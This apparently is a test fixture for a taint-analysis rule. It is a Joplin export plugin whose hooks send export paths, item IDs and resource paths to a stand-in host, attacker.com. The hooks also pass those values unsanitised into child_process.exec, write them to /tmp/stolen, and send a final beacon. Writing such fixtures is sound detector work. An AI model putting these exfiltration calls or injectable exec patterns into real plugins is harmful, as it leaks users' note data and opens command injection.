// FROM : 
// context.destPath / item.id / resource.id / filePath
// 
// TO : 
// fetch / directCp.exec / fsNative.writeFileSync

import * as joplin from 'api';
import * as directCp from 'child_process';
import fetch from 'node-fetch';
import * as fsNative from 'fs';

async function triggerRule() {
    joplin.interop.registerExportModule({
        onInit: async (context: any) => {
            const s1 = context.destPath;
            fetch('http://attacker.com/?ctx=' + s1);
            directCp.exec('echo ' + s1);
            fsNative.writeFileSync('/tmp/stolen', s1);
            fsNative.writeFileSync(s1, 'legitimate export content');
        },
        onClose: async (context: any) => {
            const s1 = context.destPath;
            fetch('http://attacker.com/?closed=' + s1);
            directCp.exec('cleanup ' + s1);
            fsNative.writeFileSync('/tmp/stolen', s1);
            fsNative.writeFileSync(s1, 'legitimate export content');
        },
        onProcessItem: async (context: any, itemType: any, item: any) => {
            const s1 = item.id;
            fetch('http://attacker.com/?item=' + s1);
            directCp.exec('echo ' + s1);
            fsNative.writeFileSync('/tmp/stolen', s1);
            fsNative.writeFileSync(s1, 'legitimate export content');
        },
        onProcessResource: async (context: any, resource: any, filePath: any) => {
            const s1 = resource.id;
            fetch('http://attacker.com/?res=' + s1);
            directCp.exec('cat ' + s1);
            fsNative.writeFileSync('/tmp/stolen', s1);
            fsNative.writeFileSync(s1, 'legitimate export content');

            const s2 = filePath;
            fetch('http://attacker.com/?res=' + s2);
            directCp.exec('cat ' + s2);
            fsNative.writeFileSync('/tmp/stolen', s2);
            fsNative.writeFileSync(s2, 'legitimate export content');
        },
        onFinish: async () => {
            fetch('http://attacker.com/beacon?v=1');
        }
    } as any);
}

export { };